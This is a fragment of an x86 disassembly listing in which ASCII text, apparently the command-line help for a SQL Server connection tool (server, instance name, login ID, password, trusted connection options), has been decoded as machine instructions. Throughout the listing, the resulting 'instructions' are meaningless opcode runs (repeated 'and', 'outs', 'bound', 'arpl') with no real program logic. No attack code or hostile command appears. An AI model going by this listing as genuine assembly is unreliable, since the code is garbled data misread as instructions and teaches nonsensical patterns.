  405236:	jb     0x40529d
  405238:	fs and BYTE PTR cs:[eax+ebp*2+0x65],dl
  40523e:	and    BYTE PTR [ecx+ebp*2+0x6d],dh
  405242:	outs   dx,DWORD PTR gs:[esi]
  405244:	jne    0x4052ba
  405246:	pop    edi
  405247:	imul   ebp,DWORD PTR [esi+0x74],0x61767265
  40524e:	ins    BYTE PTR es:[edi],dx
  40524f:	and    BYTE PTR [ebp+0x75],ch
  405252:	jae    0x4052c8
  405254:	and    BYTE PTR [edx+0x65],ah
  405257:	and    BYTE PTR [ecx+0x20],ah
  40525a:	outs   dx,BYTE PTR ds:[esi]
  40525b:	jne    0x4052ca
  40525d:	bound  esp,QWORD PTR [ebp+0x72]
  405260:	or     eax,0x2020200a
  405265:	and    BYTE PTR [eax],ah
  405267:	and    BYTE PTR [eax],ah
  405269:	and    BYTE PTR [eax],ah
  40526b:	and    BYTE PTR [eax],ah
  40526d:	and    BYTE PTR [eax],ah
  40526f:	and    BYTE PTR [eax],ah
  405271:	and    BYTE PTR [eax],ah
  405273:	and    BYTE PTR [eax],ah
  405275:	and    BYTE PTR [eax],ah
  405277:	and    BYTE PTR [eax],ah
  405279:	and    BYTE PTR [eax],ah
  40527b:	and    BYTE PTR [eax],ah
  40527d:	and    BYTE PTR [eax],ah
  40527f:	and    BYTE PTR [eax],ah
  405281:	and    BYTE PTR [edx+0x65],ah
  405284:	je     0x4052fd
  405286:	gs outs dx,BYTE PTR gs:[esi]
  405289:	and    BYTE PTR [ecx],dh
  40528b:	and    BYTE PTR [ecx+0x6e],ah
  40528e:	and    BYTE PTR fs:[edx],dh
  405291:	sub    al,0x31
  405293:	xor    al,0x37
  405295:	sub    al,0x34
  405297:	cmp    BYTE PTR [ebx],dh
  405299:	sub    al,0x36
  40529b:	xor    al,0x37
  40529d:	cs or  eax,0xd0a0d0a
  4052a3:	or     cl,BYTE PTR ds:0x4f52460a
  4052a9:	dec    ebp
  4052aa:	and    BYTE PTR [ebx+0x45],dl
  4052ad:	push   edx
  4052ae:	push   esi
  4052af:	dec    ecx
  4052b0:	inc    ebx
  4052b1:	inc    ebp
  4052b2:	and    BYTE PTR [ebx+0x65],dh
  4052b5:	jb     0x40532d
  4052b7:	imul   esp,DWORD PTR [ebx+0x65],0x6d616e5f
  4052be:	or     DWORD PTR gs:[ebx+0x70],edx
  4052c2:	arpl   WORD PTR gs:[ecx+0x66],bp
  4052c6:	imul   esp,DWORD PTR [ebp+0x73],0x65687420
  4052cd:	and    BYTE PTR [esi+0x61],ch
  4052d0:	ins    DWORD PTR es:[edi],dx
  4052d1:	and    BYTE PTR gs:[edi+0x66],ch
  4052d5:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4052d9:	and    BYTE PTR [ebx+0x65],dh
  4052dc:	jb     0x405354
  4052de:	imul   esp,DWORD PTR [ebx+0x65],0x61687420
  4052e5:	je     0x405307
  4052e7:	imul   ebp,DWORD PTR [esi+0x69],0x74616974
  4052ee:	gs jae 0x4052fe
  4052f1:	or     cl,BYTE PTR [ecx]
  4052f3:	or     DWORD PTR [ecx],ecx
  4052f5:	or     DWORD PTR [ebx+0x6f],esp
  4052f8:	outs   dx,BYTE PTR ds:[esi]
  4052f9:	jbe    0x405360
  4052fb:	jb     0x405370
  4052fd:	popa   
  4052fe:	je     0x405369
  405300:	outs   dx,DWORD PTR ds:[esi]
  405301:	outs   dx,BYTE PTR ds:[esi]
  405302:	jae    0x405332
  405304:	or     eax,0x540a0d0a
  405309:	dec    edi
  40530a:	and    BYTE PTR [ebx+0x45],dl
  40530d:	push   edx
  40530e:	push   esi
  40530f:	dec    ecx
  405310:	inc    ebx
  405311:	inc    ebp
  405312:	and    BYTE PTR [ebx+0x65],dh
  405315:	jb     0x40538d
  405317:	imul   esp,DWORD PTR [ebx+0x65],0x6d616e5f
  40531e:	or     DWORD PTR gs:[ecx],ecx
  405321:	push   ebx
  405322:	jo     0x405389
  405324:	arpl   WORD PTR [ecx+0x66],bp
  405327:	imul   esp,DWORD PTR [ebp+0x73],0x65687420
  40532e:	and    BYTE PTR [esi+0x61],ch
  405331:	ins    DWORD PTR es:[edi],dx
  405332:	and    BYTE PTR gs:[edi+0x66],ch
  405336:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40533a:	and    BYTE PTR [ecx+eiz*2+0x72],dh
  40533e:	addr16 gs je 0x405362
  405342:	jae    0x4053a9
  405344:	jb     0x4053bc
  405346:	imul   esp,DWORD PTR [ebx+0x65],0x200a0d2e
  40534d:	and    BYTE PTR [eax],ah
  40534f:	and    BYTE PTR [eax],ah
  405351:	and    BYTE PTR [eax],ah
  405353:	and    BYTE PTR [eax],ah
  405355:	and    BYTE PTR [eax],ah
  405357:	pop    ebx
  405358:	sub    al,0x20
  40535a:	bound  esi,QWORD PTR [edx+0x6f]
  40535d:	imul   esp,DWORD PTR [ebp+0x72],0x5f
  405361:	imul   esp,DWORD PTR [ebp+ebx*2+0x9],0x63657053
  405369:	imul   esp,DWORD PTR [esi+0x69],0x74207365
  405370:	push   0x65532065
  405375:	jb     0x4053ed
  405377:	imul   esp,DWORD PTR [ebx+0x65],0x6f724220
  40537e:	imul   esp,DWORD PTR [ebp+0x72],0x20
  405382:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x69666974
  40538a:	gs jb  0x4053ad
  40538d:	outs   dx,WORD PTR ds:[esi]
  40538f:	jb     0x4053b1
  405391:	je     0x4053fb
  405393:	gs or  eax,0x909090a
  405399:	or     DWORD PTR [ecx+eiz*2+0x72],esi
  40539d:	addr16 gs je 0x4053c1
  4053a1:	fs popa 
  4053a3:	je     0x405406
  4053a5:	bound  esp,QWORD PTR [ecx+0x73]
  4053a8:	cmp    esp,DWORD PTR gs:[eax]
  4053ab:	bound  esi,QWORD PTR [edx+0x6f]
  4053ae:	imul   esp,DWORD PTR [ebp+0x72],0x5f
  4053b2:	imul   esp,DWORD PTR [eax+eiz*1+0x69],0x20612073
  4053ba:	inc    edi
  4053bb:	push   ebp
  4053bc:	dec    ecx
  4053bd:	inc    esp
  4053be:	cs or  eax,0x4d0a0d0a
  4053c4:	dec    ecx
  4053c5:	push   edx
  4053c6:	push   edx
  4053c7:	dec    edi
  4053c8:	push   edx
  4053c9:	or     DWORD PTR [ecx],ecx
  4053cb:	or     DWORD PTR [ecx],ecx
  4053cd:	push   ebx
  4053ce:	jo     0x405435
  4053d0:	arpl   WORD PTR [ecx+0x66],bp
  4053d3:	imul   esp,DWORD PTR [ebp+0x73],0x61687420
  4053da:	je     0x4053fc
  4053dc:	je     0x405446
  4053de:	and    BYTE PTR gs:[ecx+0x73],ah
  4053e2:	jae    0x405453
  4053e4:	arpl   WORD PTR [ecx+0x61],bp
  4053e7:	je     0x40544e
  4053e9:	and    BYTE PTR fs:[ebx+0x65],dl
  4053ed:	jb     0x405465
  4053ef:	imul   esp,DWORD PTR [ebx+0x65],0x6f724220
  4053f6:	imul   esp,DWORD PTR [ebp+0x72],0xd
  4053fa:	or     cl,BYTE PTR [ecx]
  4053fc:	or     DWORD PTR [ecx],ecx
  4053fe:	or     DWORD PTR [ebx+0x65],esi
  405401:	jb     0x405479
  405403:	imul   esp,DWORD PTR [ebx+0x65],0x20736920
  40540a:	push   0x6574736f
  40540f:	and    BYTE PTR fs:[ecx+0x6e],ch
  405413:	and    BYTE PTR [ecx+0x20],ah
  405416:	ins    DWORD PTR es:[edi],dx
  405417:	imul   esi,DWORD PTR [edx+0x72],0x6465726f
  40541e:	and    BYTE PTR [ecx+eiz*2+0x74],ah
  405422:	popa   
  405423:	bound  esp,QWORD PTR [ecx+0x73]
  405426:	gs sub al,0x20
  405429:	popa   
  40542a:	outs   dx,BYTE PTR ds:[esi]
  40542b:	fs or  eax,0x909090a
  405431:	or     DWORD PTR [edi+0x69],esp
  405434:	jbe    0x40549b
  405436:	jae    0x405458
  405438:	je     0x4054a2
  40543a:	and    BYTE PTR gs:[ebx+0x6f],ah
  40543e:	outs   dx,BYTE PTR ds:[esi]
  40543f:	outs   dx,BYTE PTR ds:[esi]
  405440:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405445:	outs   dx,BYTE PTR ds:[esi]
  405446:	and    BYTE PTR [ecx+0x6e],ch
  405449:	outs   dx,WORD PTR ds:[esi]
  40544b:	jb     0x4054ba
  40544d:	popa   
  40544e:	je     0x4054b9
  405450:	outs   dx,DWORD PTR ds:[esi]
  405451:	outs   dx,BYTE PTR ds:[esi]
  405452:	and    BYTE PTR [edi+ebp*2+0x20],dh
  405456:	je     0x4054c0
  405458:	and    BYTE PTR gs:[ebp+0x69],ch
  40545c:	jb     0x4054d0
  40545e:	outs   dx,DWORD PTR ds:[esi]
  40545f:	jb     0x40546e
  405461:	or     cl,BYTE PTR [ecx]
  405463:	or     DWORD PTR [ecx],ecx
  405465:	or     DWORD PTR [ecx+eiz*2+0x74],esp
  405469:	popa   
  40546a:	bound  esp,QWORD PTR [ecx+0x73]
  40546d:	gs cs or eax,0x430a0d0a
  405474:	dec    edi
  405475:	dec    esi
  405476:	dec    esi
  405477:	inc    ebp
  405478:	inc    ebx
  405479:	push   esp
  40547a:	and    BYTE PTR [edi+ecx*2+0x20],dl
  40547e:	and    BYTE PTR [eax],ah
  405480:	and    BYTE PTR [eax],ah
  405482:	and    BYTE PTR [eax],ah
  405484:	and    BYTE PTR [eax],ah
  405486:	and    BYTE PTR [eax],ah
  405488:	and    BYTE PTR [eax],ah
  40548a:	and    BYTE PTR [eax],ah
  40548c:	and    BYTE PTR [eax],ah
  40548e:	and    BYTE PTR [eax],ah
  405490:	and    BYTE PTR [eax],ah
  405492:	and    BYTE PTR [ebx+0x70],dl
  405495:	arpl   WORD PTR gs:[ecx+0x66],bp
  405499:	imul   esp,DWORD PTR [ebp+0x73],0x65687420
  4054a0:	and    BYTE PTR [ebx+0x6f],ah
  4054a3:	outs   dx,BYTE PTR ds:[esi]
  4054a4:	outs   dx,BYTE PTR ds:[esi]
  4054a5:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4054aa:	outs   dx,BYTE PTR ds:[esi]
  4054ab:	and    BYTE PTR [ecx+0x6e],ch
  4054ae:	outs   dx,WORD PTR ds:[esi]
  4054b0:	jb     0x40551f
  4054b2:	popa   
  4054b3:	je     0x40551e
  4054b5:	outs   dx,DWORD PTR ds:[esi]
  4054b6:	outs   dx,BYTE PTR ds:[esi]
  4054b7:	and    BYTE PTR [esi+0x6f],ah
  4054ba:	jb     0x4054dc
  4054bc:	popa   
  4054bd:	and    BYTE PTR ds:0x2020200a,cl
  4054c3:	and    BYTE PTR [eax],ah
  4054c5:	and    BYTE PTR [eax],ah
  4054c7:	and    BYTE PTR [eax],ah
  4054c9:	and    BYTE PTR [eax],ah
  4054cb:	and    BYTE PTR [eax],ah
  4054cd:	and    BYTE PTR [eax],ah
  4054cf:	and    BYTE PTR [eax],ah
  4054d1:	and    BYTE PTR [eax],ah
  4054d3:	and    BYTE PTR [eax],ah
  4054d5:	and    BYTE PTR [eax],ah
  4054d7:	and    BYTE PTR [eax],ah
  4054d9:	and    BYTE PTR [eax],ah
  4054db:	and    BYTE PTR [eax],ah
  4054dd:	and    BYTE PTR [eax],ah
  4054df:	and    BYTE PTR [ecx+eiz*2+0x74],ah
  4054e3:	popa   
  4054e4:	bound  esp,QWORD PTR [ecx+0x73]
  4054e7:	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
  4054ec:	bound  esp,QWORD PTR [ebp+0x20]
  4054ef:	ins    DWORD PTR es:[edi],dx
  4054f0:	outs   dx,DWORD PTR ds:[esi]
  4054f1:	outs   dx,BYTE PTR ds:[esi]
  4054f2:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x66206465
  4054fa:	outs   dx,DWORD PTR ds:[esi]
  4054fb:	jb     0x40551d
  4054fd:	jb     0x405574
  4054ff:	outs   dx,BYTE PTR ds:[esi]
  405500:	je     0x40556b
  405502:	ins    DWORD PTR es:[edi],dx
  405503:	and    BYTE PTR gs:[ebp+0x72],ah
  405507:	jb     0x405578
  405509:	jb     0x40557e
  40550b:	or     eax,0x2020200a
  405510:	and    BYTE PTR [eax],ah
  405512:	and    BYTE PTR [eax],ah
  405514:	and    BYTE PTR [eax],ah
  405516:	and    BYTE PTR [eax],ah
  405518:	and    BYTE PTR [eax],ah
  40551a:	and    BYTE PTR [eax],ah
  40551c:	and    BYTE PTR [eax],ah
  40551e:	and    BYTE PTR [eax],ah
  405520:	and    BYTE PTR [eax],ah
  405522:	and    BYTE PTR [eax],ah
  405524:	and    BYTE PTR [eax],ah
  405526:	and    BYTE PTR [eax],ah
  405528:	and    BYTE PTR [eax],ah
  40552a:	and    BYTE PTR [eax],ah
  40552c:	and    BYTE PTR [ecx+0x6e],ch
  40552f:	and    BYTE PTR [ebx+0x65],dl
  405532:	jb     0x4055aa
  405534:	imul   esp,DWORD PTR [ebx+0x65],0x6f724220
  40553b:	imul   esp,DWORD PTR [ebp+0x72],0x20
  40553f:	arpl   WORD PTR [edi+0x6e],bp
  405542:	jbe    0x4055a9
  405544:	jb     0x4055b9
  405546:	popa   
  405547:	je     0x4055b2
  405549:	outs   dx,DWORD PTR ds:[esi]
  40554a:	outs   dx,BYTE PTR ds:[esi]
  40554b:	jae    0x40557b
  40554d:	or     eax,0x2d0a0d0a
  405552:	inc    ebp
  405553:	or     DWORD PTR [ecx],ecx
  405555:	or     DWORD PTR [ecx],ecx
  405557:	dec    edi
  405558:	jo     0x4055bf
  40555a:	outs   dx,BYTE PTR ds:[esi]
  40555b:	jae    0x40557d
  40555d:	popa   
  40555e:	and    BYTE PTR [edi+0x69],dl
  405561:	outs   dx,BYTE PTR ds:[esi]
  405562:	outs   dx,DWORD PTR fs:[esi]
  405564:	ja     0x4055d9
  405566:	and    BYTE PTR [ecx+0x75],al
  405569:	je     0x4055d3
  40556b:	outs   dx,BYTE PTR gs:[esi]
  40556d:	je     0x4055d8
  40556f:	arpl   WORD PTR [ecx+0x74],sp
  405572:	imul   ebp,DWORD PTR [edi+0x6e],0x6e6f6320
  405579:	outs   dx,BYTE PTR ds:[esi]
  40557a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40557f:	outs   dx,BYTE PTR ds:[esi]
  405580:	and    BYTE PTR [edi+ebp*2+0x20],dh
  405584:	popa   
  405585:	outs   dx,BYTE PTR ds:[esi]
  405586:	or     eax,0x909090a
  40558b:	or     DWORD PTR [ecx+0x6e],ebp
  40558e:	jae    0x405604
  405590:	popa   
  405591:	outs   dx,BYTE PTR ds:[esi]
  405592:	arpl   WORD PTR [ebp+0x20],sp
  405595:	outs   dx,DWORD PTR ds:[esi]
  405596:	data16 and BYTE PTR [eax+ebp*2+0x65],dh
  40559b:	and    BYTE PTR [ebx+0x51],dl
  40559e:	dec    esp
  40559f:	and    BYTE PTR [ebx+0x65],dl
  4055a2:	jb     0x40561a
  4055a4:	gs jb  0x4055c7
  4055a7:	inc    esp
  4055a8:	popa   
  4055a9:	je     0x40560c
  4055ab:	bound  esp,QWORD PTR [ecx+0x73]
  4055ae:	and    BYTE PTR gs:[ebp+0x6e],al
  4055b2:	imul   ebp,DWORD PTR [bp+0x65],0x69737520
  4055ba:	outs   dx,BYTE PTR ds:[esi]
  4055bb:	addr16 or eax,0x909090a
  4055c1:	or     DWORD PTR [ecx+0x6f],edi
  4055c4:	jne    0x405638
  4055c6:	and    BYTE PTR [edi+0x69],dl
  4055c9:	outs   dx,BYTE PTR ds:[esi]
  4055ca:	outs   dx,DWORD PTR fs:[esi]
  4055cc:	ja     0x405641
  4055ce:	and    BYTE PTR [ecx+0x63],ah
  4055d1:	arpl   WORD PTR [edi+0x75],bp
  4055d4:	outs   dx,BYTE PTR ds:[esi]
  4055d5:	je     0x405605
  4055d7:	and    BYTE PTR [edx+0x79],al
  4055da:	and    BYTE PTR [ebp+eiz*2+0x66],ah
  4055de:	popa   
  4055df:	jne    0x40564d
  4055e1:	je     0x40560f
  4055e3:	and    BYTE PTR [ecx+0x66],ch
  4055e6:	and    BYTE PTR [esi+0x65],ch
  4055e9:	imul   esi,DWORD PTR [eax+ebp*2+0x65],0x452d2072
  4055f1:	or     eax,0x909090a
  4055f6:	or     DWORD PTR [edi+0x72],ebp
  4055f9:	and    BYTE PTR ds:0x72612055,ch
  4055ff:	and    BYTE PTR gs:[ebx+0x70],dh
  405603:	arpl   WORD PTR gs:[ecx+0x66],bp
  405607:	imul   esp,DWORD PTR [ebp+0x64],0x7373202c
  40560e:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  405612:	outs   dx,BYTE PTR ds:[si]
  405614:	outs   dx,DWORD PTR ds:[esi]
  405615:	jae    0x40567c
  405617:	and    BYTE PTR [ebp+0x73],dh
  40561a:	gs jae 0x40563d
  40561d:	push   edi
  40561e:	imul   ebp,DWORD PTR [esi+0x64],0xd73776f
  405625:	or     cl,BYTE PTR [ecx]
  405627:	or     DWORD PTR [ecx],ecx
  405629:	or     DWORD PTR [ecx+0x75],eax
  40562c:	je     0x405696
  40562e:	outs   dx,BYTE PTR gs:[esi]
  405630:	je     0x40569b
  405632:	arpl   WORD PTR [ecx+0x74],sp
  405635:	imul   ebp,DWORD PTR [edi+0x6e],0xd0a0d2e
  40563c:	or     ch,BYTE PTR ds:0x6f6c2055
  405642:	imul   ebp,DWORD PTR [bp+0x5f],0x9096469
  40564a:	or     DWORD PTR [edi+0x70],ecx
  40564d:	outs   dx,BYTE PTR gs:[esi]
  40564f:	jae    0x405671
  405651:	popa   
  405652:	and    BYTE PTR [ebx+0x51],dl
  405655:	dec    esp
  405656:	and    BYTE PTR [ebx+0x65],dl
  405659:	jb     0x4056d1
  40565b:	gs jb  0x40567e
  40565e:	inc    ecx
  40565f:	jne    0x4056d5
  405661:	push   0x69746e65
  405666:	arpl   WORD PTR [ecx+0x74],sp
  405669:	imul   ebp,DWORD PTR [edi+0x6e],0x6e6f6320
  405670:	outs   dx,BYTE PTR ds:[esi]
  405671:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405676:	outs   dx,BYTE PTR ds:[esi]
  405677:	and    BYTE PTR [edi+ebp*2+0xd],dh
  40567b:	or     cl,BYTE PTR [ecx]
  40567d:	or     DWORD PTR [ecx],ecx
  40567f:	or     DWORD PTR [ecx+0x6e],esp
  405682:	and    BYTE PTR [ecx+0x6e],ch
  405685:	jae    0x4056fb
  405687:	popa   
  405688:	outs   dx,BYTE PTR ds:[esi]
  405689:	arpl   WORD PTR [ebp+0x20],sp
  40568c:	outs   dx,DWORD PTR ds:[esi]
  40568d:	data16 and BYTE PTR [eax+ebp*2+0x65],dh
  405692:	and    BYTE PTR [ecx+eiz*2+0x74],al
  405696:	popa   
  405697:	bound  esp,QWORD PTR [ecx+0x73]
  40569a:	and    BYTE PTR gs:[ebp+0x6e],al
  40569e:	imul   ebp,DWORD PTR [bp+0x65],0x69737520
  4056a6:	outs   dx,BYTE PTR ds:[esi]
  4056a7:	and    BYTE PTR [si+0x68],dh
  4056ab:	gs or  eax,0x909090a
  4056b1:	or     DWORD PTR [ebx+0x70],esi
  4056b4:	arpl   WORD PTR gs:[ecx+0x66],bp
  4056b8:	imul   esp,DWORD PTR [ebp+0x64],0x676f6c20
  4056bf:	imul   ebp,DWORD PTR [esi+0x20],0xd2e4449
  4056c6:	or     cl,BYTE PTR ds:0x20502d0a
  4056cc:	jo     0x40572f
  4056ce:	jae    0x405743
  4056d0:	ja     0x405741
  4056d2:	jb     0x405738
  4056d4:	or     DWORD PTR [ecx],ecx
  4056d6:	or     DWORD PTR [ebx+0x70],edx
  4056d9:	arpl   WORD PTR gs:[ecx+0x66],bp
  4056dd:	imul   esp,DWORD PTR [ebp+0x73],0x65687420
  4056e4:	and    BYTE PTR [eax+0x61],dh
  4056e7:	jae    0x40575c
  4056e9:	ja     0x40575a
  4056eb:	jb     0x405751
  4056ed:	and    BYTE PTR [esi+0x6f],ah
  4056f0:	jb     0x405712
  4056f2:	je     0x40575c
  4056f4:	and    BYTE PTR gs:[edi+ebp*2+0x67],ch
  4056f9:	imul   ebp,DWORD PTR [esi+0x20],0x74616874
  405700:	and    BYTE PTR [ecx+0x73],ch
  405703:	or     eax,0x909090a
  405708:	or     DWORD PTR [ebx+0x70],esi
  40570b:	arpl   WORD PTR gs:[ecx+0x66],bp
  40570f:	imul   esp,DWORD PTR [ebp+0x64],0x206e6920
  405716:	sub    eax,0xa0d2e55
  40571b:	or     eax,0x20532d0a
  405720:	jae    0x405787
  405722:	jb     0x40579a
  405724:	gs jb  0x405786
  405727:	outs   dx,BYTE PTR ds:[esi]
  405728:	popa   
  405729:	ins    DWORD PTR es:[edi],dx
  40572a:	gs pop ebx
  40572c:	pop    esp
  40572d:	imul   ebp,DWORD PTR [esi+0x73],0x636e6174
  405734:	gs pop edi
  405736:	outs   dx,BYTE PTR ds:[esi]
  405737:	popa   
  405738:	ins    DWORD PTR es:[edi],dx
  405739:	gs pop ebp
  40573b:	or     DWORD PTR [ebx+0x70],edx
  40573e:	arpl   WORD PTR gs:[ecx+0x66],bp
  405742:	imul   esp,DWORD PTR [ebp+0x73],0x65687420
  405749:	and    BYTE PTR [ecx+0x6e],ch
  40574c:	jae    0x4057c2
  40574e:	popa   
  40574f:	outs   dx,BYTE PTR ds:[esi]
  405750:	arpl   WORD PTR [ebp+0x20],sp
  405753:	outs   dx,DWORD PTR ds:[esi]
  405754:	data16 and BYTE PTR [eax+ebp*2+0x65],dh
  405759:	and    BYTE PTR [ecx+eiz*2+0x74],al
  40575d:	popa   
  40575e:	bound  esp,QWORD PTR [ecx+0x73]
  405761:	and    BYTE PTR gs:[ebp+0x6e],al
  405765:	imul   ebp,DWORD PTR [bp+0x65],0x9090a0d
  40576d:	or     DWORD PTR [ecx],ecx
  40576f:	push   0x69646c6f
  405774:	outs   dx,BYTE PTR ds:[esi]
  405775:	and    BYTE PTR [si+0x68],dh
  405779:	and    BYTE PTR gs:[ebx+0x65],dl
  40577d:	jb     0x4057f5
  40577f:	imul   esp,DWORD PTR [ebx+0x65],0x6f724220
  405786:	imul   esp,DWORD PTR [ebp+0x72],0x20
  40578a:	jae    0x4057f1
  40578c:	jb     0x405804
  40578e:	imul   esp,DWORD PTR [ebx+0x65],0x206f7420
  405795:	bound  esp,QWORD PTR [ebp+0xd]
  405798:	or     cl,BYTE PTR [ecx]
  40579a:	or     DWORD PTR [ecx],ecx
  40579c:	or     DWORD PTR [ecx+0x6e],esp
  40579f:	popa   
  4057a0:	ins    BYTE PTR es:[edi],dx
  4057a1:	jns    0x40581d
  4057a3:	gs fs and BYTE PTR cs:[ebx+0x70],dl
  4057a9:	arpl   WORD PTR gs:[ecx+0x66],bp
  4057ad:	jns    0x4057cf
  4057af:	jae    0x405816
  4057b1:	jb     0x405829
  4057b3:	gs jb  0x405815
  4057b6:	outs   dx,BYTE PTR ds:[esi]
  4057b7:	popa   
  4057b8:	ins    DWORD PTR es:[edi],dx
  4057b9:	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
  4057be:	arpl   WORD PTR [edi+0x6e],bp
  4057c1:	outs   dx,BYTE PTR ds:[esi]
  4057c2:	arpl   WORD PTR gs:[eax+eiz*1+0x74],si
  4057c7:	outs   dx,DWORD PTR ds:[esi]
  4057c8:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4057cc:	or     eax,0x909090a
  4057d1:	or     DWORD PTR [ebp+eiz*2+0x66],esp
  4057d5:	popa   
  4057d6:	jne    0x405844
  4057d8:	je     0x4057fa
  4057da:	imul   ebp,DWORD PTR [esi+0x73],0x636e6174
  4057e1:	and    BYTE PTR gs:[edi+0x6e],ch
  4057e5:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4057e9:	and    BYTE PTR [ebx+0x70],dh
  4057ec:	arpl   WORD PTR gs:[ecx+0x66],bp
  4057f0:	imul   esp,DWORD PTR [ebp+0x64],0x6d6f6320
  4057f7:	jo     0x40586e
  4057f9:	je     0x405860
  4057fb:	jb     0x40582b
  4057fd:	or     eax,0x909090a
  405802:	or     DWORD PTR [ebx+0x70],edx
  405805:	arpl   WORD PTR gs:[ecx+0x66],bp
  405809:	jns    0x40582b
  40580b:	jae    0x405872
  40580d:	jb     0x405885
  40580f:	gs jb  0x405871
  405812:	outs   dx,BYTE PTR ds:[esi]
  405813:	popa   
  405814:	ins    DWORD PTR es:[edi],dx
  405815:	gs pop esp
  405817:	imul   ebp,DWORD PTR [esi+0x73],0x636e6174
  40581e:	gs pop edi
  405820:	outs   dx,BYTE PTR ds:[esi]
  405821:	popa   
  405822:	ins    DWORD PTR es:[edi],dx
  405823:	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
  405828:	arpl   WORD PTR [edi+0x6e],bp
  40582b:	outs   dx,BYTE PTR ds:[esi]
  40582c:	arpl   WORD PTR gs:[eax+eiz*1+0x74],si
  405831:	outs   dx,DWORD PTR ds:[esi]
  405832:	or     eax,0x909090a
  405837:	or     DWORD PTR [ecx+0x20],esp
  40583a:	outs   dx,BYTE PTR ds:[esi]
  40583b:	popa   
  40583c:	ins    DWORD PTR es:[edi],dx
  40583d:	gs and BYTE PTR fs:[ecx+0x6e],ch
  405842:	jae    0x4058b8
  405844:	popa   
  405845:	outs   dx,BYTE PTR ds:[esi]
  405846:	arpl   WORD PTR [ebp+0x2e],sp
  405849:	and    BYTE PTR [ecx+0x66],cl
  40584c:	and    BYTE PTR ds:0x73692053,ch
  405852:	and    BYTE PTR [esi+0x6f],ch
  405855:	je     0x405877
  405857:	jae    0x4058c9
  405859:	arpl   WORD PTR gs:[ecx+0x66],bp
  40585d:	imul   esp,DWORD PTR [ebp+0x64],0x90a0d2c
  405864:	or     DWORD PTR [ecx],ecx
  405866:	or     DWORD PTR [ebx+0x73],esi
  405869:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  40586d:	outs   dx,BYTE PTR ds:[si]
  40586f:	outs   dx,DWORD PTR ds:[esi]
  405870:	jae    0x4058d7
  405872:	and    BYTE PTR [ebx+0x6f],ah
  405875:	outs   dx,BYTE PTR ds:[esi]
  405876:	outs   dx,BYTE PTR ds:[esi]
  405877:	arpl   WORD PTR gs:[ebx+esi*2+0x20],si
  40587c:	je     0x4058ed
  40587e:	and    BYTE PTR [eax+ebp*2+0x65],dh
  405882:	and    BYTE PTR [ebp+eiz*2+0x66],ah
  405886:	popa   
  405887:	jne    0x4058f5
  405889:	je     0x4058ab
  40588b:	imul   ebp,DWORD PTR [esi+0x73],0x636e6174
  405892:	and    BYTE PTR gs:[edi+0x6e],ch
  405896:	or     eax,0x909090a
  40589b:	or     DWORD PTR [eax+ebp*2+0x65],esi
  40589f:	and    BYTE PTR [edi+ebp*2+0x63],ch
  4058a3:	popa   
  4058a4:	ins    BYTE PTR es:[edi],dx
  4058a5:	and    BYTE PTR [ebx+0x6f],ah
  4058a8:	ins    DWORD PTR es:[edi],dx
  4058a9:	jo     0x405920
  4058ab:	je     0x405912
  4058ad:	jb     0x4058dd
  4058af:	or     eax,0x2d0a0d0a
  4058b4:	and    BYTE PTR fs:[ecx+eiz*2+0x74],ah
  4058b9:	popa   
  4058ba:	bound  esp,QWORD PTR [ecx+0x73]
  4058bd:	gs pop edi
  4058bf:	outs   dx,BYTE PTR ds:[esi]
  4058c0:	popa   
  4058c1:	ins    DWORD PTR es:[edi],dx
  4058c2:	or     DWORD PTR gs:[ecx],ecx
  4058c5:	push   ebx
  4058c6:	jo     0x40592d
  4058c8:	arpl   WORD PTR [ecx+0x66],bp
  4058cb:	imul   esp,DWORD PTR [ebp+0x73],0x65687420
  4058d2:	and    BYTE PTR [esi+0x61],ch
  4058d5:	ins    DWORD PTR es:[edi],dx
  4058d6:	and    BYTE PTR gs:[edi+0x66],ch
  4058da:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4058de:	and    BYTE PTR [ecx+eiz*2+0x74],ah
  4058e2:	popa   
  4058e3:	bound  esp,QWORD PTR [ecx+0x73]
  4058e6:	and    BYTE PTR gs:[eax+ebp*2+0x61],dh
  4058eb:	je     0x40590d
  4058ed:	imul   esi,DWORD PTR [ebx+0xd],0x909090a
  4058f4:	or     DWORD PTR [eax+0x6f],ebp
  4058f7:	ins    BYTE PTR es:[edi],dx
  4058f8:	imul   ebp,DWORD PTR fs:[esi+0x67],0x65687420
  405900:	and    BYTE PTR [ebx+0x65],dh
  405903:	jb     0x40597b
  405905:	imul   esp,DWORD PTR [ebx+0x65],0x206f7420
  40590c:	bound  esp,QWORD PTR [ebp+0x20]
  40590f:	popa   
  405910:	outs   dx,BYTE PTR ds:[esi]
  405911:	popa   
  405912:	ins    BYTE PTR es:[edi],dx
  405913:	jns    0x40598f
  405915:	gs fs and BYTE PTR cs:[ecx+0x66],cl
  40591b:	and    BYTE PTR ds:0x73692064,ch
  405921:	or     eax,0x909090a
  405926:	or     DWORD PTR [esi+0x6f],ebp
  405929:	je     0x40594b
  40592b:	jae    0x40599d
  40592d:	arpl   WORD PTR gs:[ecx+0x66],bp
  405931:	imul   esp,DWORD PTR [ebp+0x64],0x6874202c
  405938:	and    BYTE PTR gs:[ebp+eiz*2+0x66],ah
  40593d:	popa   
  40593e:	jne    0x4059ac
  405940:	je     0x405962
  405942:	imul   esi,DWORD PTR [ebx+0x20],0x72756f79
  405949:	and    BYTE PTR [edi+ebp*2+0x67],ch
  40594d:	imul   ebp,DWORD PTR [esi+0x27],0x90a0d73
  405954:	or     DWORD PTR [ecx],ecx
  405956:	or     DWORD PTR [ebp+eiz*2+0x66],esp
  40595a:	popa   
  40595b:	jne    0x4059c9
  40595d:	je     0x40597f
  40595f:	fs popa 
  405961:	je     0x4059c4
  405963:	bound  esp,QWORD PTR [ecx+0x73]
